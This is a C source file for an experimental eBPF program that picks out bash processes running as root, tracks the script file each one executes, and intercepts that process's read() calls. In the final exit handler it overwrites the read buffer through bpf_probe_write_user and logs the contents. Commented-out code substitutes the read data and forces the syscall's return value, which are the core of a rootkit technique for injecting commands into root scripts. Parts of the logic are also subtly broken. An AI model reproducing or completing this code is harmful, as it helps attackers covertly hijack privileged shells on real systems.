// hbashmagnumopus.bpf.c 
// Tracks execve argv[1], watches openat for matching filename, records returned fd on sys_exit_openat, 
// and when read(fd) is called, prints content read from that fd (bounded).
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include <stddef.h>
#include <stdint.h>

// for offsetof(struct pt_regs, ...)
#include <linux/ptrace.h>   // asm/ptrace.h
#include <asm/unistd_64.h>

// #include "vmlinux.h"

#define MAX_BUF 128
#define MAX_ENTRIES 10240
#define TASK_COMM_LEN 16

char LICENSE[] SEC("license") = "GPL";


// Define a BPF map to store the filenames
// Key: PID (u32), Value: filename (char array)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, uint32_t);
    __type(value, char[MAX_BUF]);
} exec_argv1_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_ENTRIES);
    __type(key, uint32_t);
    __type(value, char[MAX_BUF]);
} openat_path_map SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 10240);
    __type(key, uint32_t);    // pid
    __type(value, void*); // user buffer pointer
} active_bufs SEC(".maps");

int is_bash_with_root(struct pt_regs *ctx)
{
    char comm[TASK_COMM_LEN];
    
    bpf_get_current_comm(&comm, sizeof(comm));
    
    // check if bash
    if(__builtin_memcmp(comm, "bash", 4) == 0) {
        
        // Get the current user and group IDs
        unsigned long long uid_gid = bpf_get_current_uid_gid();
        
        // UID is in lower 32 bits
        uint32_t uid = (uint32_t)uid_gid;
        
        // bpf_printk("Bash found, COMM=> %s uid=> %u\n", comm, uid);
        
        // if bash is in root
        if(uid==0)
        {
            // bpf_printk("\nROOOOOOOOOT\n");
            bpf_printk("Bash found, COMM=> %s uid=> %u\n", comm, uid);
            return 1;
        }
    }
    return 0;
}

int Parse_Sysenter_Execve(unsigned long regs_ptr)
{
    // 3) read syscall arguments from pt_regs registers offsets (x86_64 ABI)
    unsigned long filename_ptr = 0;
    unsigned long argv_ptr = 0;

    // rdi is first arg, rsi is second arg on x86_64
    if (bpf_probe_read(&filename_ptr, sizeof(filename_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
    {
        return 0;
    }

    if (bpf_probe_read(&argv_ptr, sizeof(argv_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
    {
        return 0;
    }

    // 4) read filename string from userspace
    char fname[128];
    if (filename_ptr && bpf_probe_read_user_str(fname, sizeof(fname), (const void *)filename_ptr) > 0)
    {
        bpf_printk("execve filename: %s\n", fname);
    }

    // Directly take i=1 instead of unrolling
    unsigned long argp = 0;
    unsigned long user_ptr = argv_ptr + 1 * sizeof(unsigned long);
    if (argv_ptr == 0)
    {
        return 0;
    }
    if (bpf_probe_read_user(&argp, sizeof(argp), (void *)user_ptr) < 0)
    {
        return 0;
    }
    if (argp == 0)
    {
        return 0;
    }

    char argbuf[128];
    uint32_t pid;
    if (bpf_probe_read_user_str(argbuf, sizeof(argbuf), (const void *)argp) > 0)
    {

        bpf_printk("bash ____ argv[%d] = %s\n", 1, argbuf);
        
        pid = bpf_get_current_pid_tgid() >> 32;
        bpf_map_update_elem(&exec_argv1_map, &pid, &argbuf, BPF_ANY);

    }
    else 
    {
        return 0;
    }

    // 5) walk argv[] (user memory). Limit loop with pragma unroll.
    /*
    #pragma unroll
    for (int i = 0; i < 2; i++)
    {
        unsigned long argp = 0;
        // argv_ptr points to userspace array of pointers. Read address of argv[i] from userspace.
        // Note: bpf_probe_read_user reads from userspace addresses.
        unsigned long user_ptr = argv_ptr + i * sizeof(unsigned long);
        if (argv_ptr == 0)
        {
            break;
        }

        if (bpf_probe_read_user(&argp, sizeof(argp), (void *)user_ptr) < 0)
        {
            break;
        }
        if (argp == 0)
        {
            break;
        }

        char argbuf[128];
        if (bpf_probe_read_user_str(argbuf, sizeof(argbuf), (const void *)argp) > 0)
        {
            bpf_printk("argv[%d] = %s\n", i, argbuf);
        }
        else 
        {
            break;
        }
    }
    */

    return 0;
}

/* =========== Tracepoints =========== */

/* execve enter: take file name and */
/* store in exec_filenames keyed by pid. */
SEC("raw_tracepoint/sys_enter")
int trace_execve(struct bpf_raw_tracepoint_args *ctx)
{
    // 1) safely read ctx->args[0] into regs_ptr
    unsigned long regs_ptr = 0;

    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
    {
        return 0;
    }

    // regs_ptr now holds kernel address of struct pt_regs
    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
    unsigned long syscall_nr = 0;

    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
    {
        return 0;
    }
    
    if (syscall_nr != __NR_execve || !is_bash_with_root(ctx))
    {
        return 0;
    }

    Parse_Sysenter_Execve(regs_ptr);

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;

    bpf_printk("from trace_execve==> PID %d, argv[1] from map: %s\n", pid,bpf_map_lookup_elem(&exec_argv1_map, &pid));

    return 0;
}

SEC("raw_tracepoint/sys_enter")
int tp_openat_enter(struct bpf_raw_tracepoint_args *ctx)
{
    // 1) safely read ctx->args[0] into regs_ptr
    unsigned long regs_ptr = 0;

    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
    {
        return 0;
    }

    // regs_ptr now holds kernel address of struct pt_regs
    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
    unsigned long syscall_nr = 0;

    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
    {
        return 0;
    }
    
    if (syscall_nr != __NR_openat || !is_bash_with_root(ctx))
    {
        return 0;
    }
    
    // bpf_printk("Hello from tp_openat_enter\n");

    unsigned long pathname_ptr = 0;
    if (bpf_probe_read(&pathname_ptr, sizeof(pathname_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
    {
        return 0;
    }

    if (!pathname_ptr)
        return 0;

    // char fname[MAX_BUF];
    // if (bpf_probe_read_user_str(fname, sizeof(fname), (const void *)pathname_ptr) > 0)
    // {
    //     bpf_printk("openat pathname: %s\n", fname);
    // }
    char pathname[MAX_BUF];
    if (bpf_probe_read_user_str(pathname, sizeof(pathname), (const void *)pathname_ptr) <= 0)
        return 0;

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;

    // --- look up argv[1] for this PID ---
    char *argv1 = bpf_map_lookup_elem(&exec_argv1_map, &pid);
    if (!argv1)
        return 0;


    if (__builtin_memcmp(pathname, argv1, sizeof(argv1)) == 0) {
        bpf_printk("openat match: pathname=%s equals argv1=%s\n", pathname, argv1);
        bpf_map_update_elem(&openat_path_map, &pid, &pathname, BPF_ANY);
    }


    return 0;
}




// sys_enter: stash buffer pointer
SEC("raw_tracepoint/sys_enter")
int kp__x64_sys_read(struct bpf_raw_tracepoint_args *ctx)
{
    // 1) safely read ctx->args[0] into regs_ptr
    unsigned long regs_ptr = 0;

    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
    {
        return 0;
    }

    // regs_ptr now holds kernel address of struct pt_regs
    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
    unsigned long syscall_nr = 0;

    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
    {
        return 0;
    }
    
    if (syscall_nr != __NR_read || !is_bash_with_root(ctx))
    {
        return 0;
    }
    // bpf_printk(" Hello from tp_read_exit\n");

    int ret = 0;
    if (bpf_probe_read(&ret, sizeof(ret),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rax))) < 0)
    {
        return 0;
    }

    if (ret <= 0) 
        return 0;  // nothing read

    int fd = 0;
    if (bpf_probe_read(&fd, sizeof(fd),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
        return 0;

    // if(fd!=3)
    // {
    //     return 0;
    // }

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;
    // struct fd_key key = {.pid = pid, .fd = fd};

    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
    if (!pathname)
        return 0;

    
    bpf_printk("SYSENTER read trying to get buffer\n");

    // Now grab buffer pointer (2nd arg of read = rsi)
    void* buf_ptr = 0;
    if (bpf_probe_read(&buf_ptr, sizeof(buf_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
    {
        // return 0;
    }
    
    // void *buf = (void *)ctx->args[1]; // args[1] = buf
    bpf_printk("storing in map\n");

    bpf_map_update_elem(&active_bufs, &pid, &buf_ptr, BPF_ANY);
    return 0;
}

// SEC("kprobe/__x64_sys_read")
// int kp__x64_sys_read(struct pt_regs *ctx)
// {
//     if (!is_bash_with_root(ctx))
//         return 0;

//     uint32_t pid = bpf_get_current_pid_tgid() >> 32;
    
//     char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
//     if (!pathname)
//         return 0;
    
//     // int fd = (int)PT_REGS_PARM1(ctx);

//     // int fd = (int)PT_REGS_PARM1(ctx);
//     int fd = (int)PT_REGS_PARM1(ctx);
//     // if (bpf_probe_read(&fd, sizeof(fd),
//     //                    (void *)(ctx + offsetof(struct pt_regs, rdi))) < 0)
//     //     return 0;
//     // bpf_probe_read(&fd, sizeof(fd), &ctx->rdi);

//     // void *buf = (void *)PT_REGS_PARM2(ctx);

//     void* buf = (void*)PT_REGS_PARM2(ctx);
//     // if (bpf_probe_read(&buf, sizeof(buf),
//     //                    (void *)(ctx + offsetof(struct pt_regs, rsi))) < 0)
//     // {
//     //     return 0;
//     // }
//     // bpf_probe_read(&buf, sizeof(buf), &ctx->rsi);

//     // size_t count = (size_t)PT_REGS_PARM3(ctx);
//     unsigned long count = (unsigned long)PT_REGS_PARM3(ctx);
//     // if (bpf_probe_read(&count, sizeof(count),
//     //                    (void *)(ctx + offsetof(struct pt_regs, rdx))) < 0)
//     // {
//     //     return 0;
//     // }
//     // bpf_probe_read(&count, sizeof(count), &ctx->rdx);
//     bpf_printk("YOYOYOYOYO from sysread\n");

//     if (!buf || count == 0)
//         return 0;


//     /* Example filter: only intercept a specific fd (uncomment if needed)*/
//     if (fd != 3)
//         return 0;

    

//     /* replacement message */
//     const char msg[] = "Hello from ebpf!! Nice to meet you\n";
//     int msglen = sizeof(msg) - 1;

//     /* write at most count bytes (don't overflow user buffer) */
//     int write_len = msglen;
//     if ((size_t)write_len > count)
//         write_len = (int)count;

//     /* Try to write to user buffer */
//     if (bpf_probe_write_user((void*)buf, msg, write_len) != 0) {
//         /* write failed (helper may be restricted), bail out */
//         bpf_printk("bpf_probe_write_user failed\n");
//         return 0;
//     }

//     /* override syscall return value to write_len */
//     /* bpf_override_return expects (struct pt_regs *regs, __u64 rc) for kprobes */
//     bpf_override_return(ctx, (unsigned long)write_len);

//     bpf_printk("intercepted read: pid=%d fd=%d wrote=%d\n",
//                pid, fd, write_len);
//     return 0; /* not reached after override, but keep for verifier */
// }


SEC("raw_tracepoint/sys_exit")
int tp_read_exit(struct bpf_raw_tracepoint_args *ctx)
{
    // 1) safely read ctx->args[0] into regs_ptr
    unsigned long regs_ptr = 0;

    if (bpf_probe_read(&regs_ptr, sizeof(regs_ptr), &ctx->args[0]) < 0)
    {
        return 0;
    }

    // regs_ptr now holds kernel address of struct pt_regs
    // 2) read syscall number from pt_regs->orig_rax (kernel memory)
    unsigned long syscall_nr = 0;

    // Use offsetof to locate orig_rax inside pt_regs (x86_64)
    if (bpf_probe_read(&syscall_nr, sizeof(syscall_nr), 
                    (void *)(regs_ptr + offsetof(struct pt_regs, orig_rax))) < 0)
    {
        return 0;
    }
    
    if (syscall_nr != __NR_read || !is_bash_with_root(ctx))
    {
        return 0;
    }
    // bpf_printk(" Hello from tp_read_exit\n");

    int ret = 0;
    if (bpf_probe_read(&ret, sizeof(ret),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rax))) < 0)
    {
        return 0;
    }

    if (ret <= 0) 
        return 0;  // nothing read

    int fd = 0;
    if (bpf_probe_read(&fd, sizeof(fd),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rdi))) < 0)
        return 0;

    if(fd!=3)
    {
        return 0;
    }

    uint32_t pid = bpf_get_current_pid_tgid() >> 32;
    // struct fd_key key = {.pid = pid, .fd = fd};

    char *pathname = bpf_map_lookup_elem(&openat_path_map, &pid);
    if (!pathname)
        return 0;

    // Now grab buffer pointer (2nd arg of read = rsi)
    unsigned long buf_ptr = 0;
    if (bpf_probe_read(&buf_ptr, sizeof(buf_ptr),
                       (void *)(regs_ptr + offsetof(struct pt_regs, rsi))) < 0)
    {
        return 0;
    }

    void *user_buf = bpf_map_lookup_elem(&active_bufs, &pid);
    if (!user_buf)
        return 0;

    const char patch[] = "XXXX";
    bpf_probe_write_user(user_buf, patch, sizeof(patch)-1);
    
    // char newcommand[] = "YOOOOO";
    
    // bpf_probe_write_user((void *)buf_ptr, newcommand, sizeof(newcommand));

    char data[128];
    int copy = ret < sizeof(data) ? ret : sizeof(data)-1;
    if (bpf_probe_read_user(data, copy, (void *)buf_ptr) < 0)
        return 0;
    data[copy] = 0;

    bpf_printk("read: pid=%d fd=%d path=%s data=%s ret=%d\n",
               pid, fd, pathname, data, ret);

    return 0;
}